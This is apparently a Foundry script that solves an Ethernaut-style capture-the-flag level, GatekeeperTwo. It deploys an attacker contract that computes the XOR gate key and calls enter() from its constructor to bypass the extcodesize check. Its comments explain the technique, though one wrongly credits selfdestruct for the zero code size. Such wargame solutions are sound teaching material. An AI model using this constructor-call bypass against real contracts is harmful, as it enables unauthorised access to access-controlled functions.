// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { GatekeeperTwo } from "../src/level14.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// @notice tx.origin, 0 extcodesize(selfdestruct), bitwise XOR
contract Level14Solution is Script {
    GatekeeperTwo level = GatekeeperTwo(0xEDC719158fA9E79bFd211661eD6b4B3505a54a96);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attacker(level);
        
        vm.stopBroadcast();
    }
}

contract Attacker {
    GatekeeperTwo level;

    constructor(GatekeeperTwo _level) {
        level = _level;
        // type(uint64).max = 18446744073709551615
        // To find the gateKey for gateThree, we can reverse the XOR by using uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        console.logBytes8(gateKey);

        
        (bool success, ) = address(level).call(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if(success){
            console.log(success);
            console.log("entrant: ", level.entrant());
            // The level gateTwo is checking for an extcodesize of 0, which essentially means zero code from the caller contract
            // To have extcodesize return 0 for a contract, you would typically need to ensure that no contract code is 
            // actually deployed at that address. Hence, selfdestruct in the constructor will prevent the contract from being deployed
            // 'deployed'. Hence, returning 0 extcodesize
            selfdestruct(payable(msg.sender));
        }
        
    }
}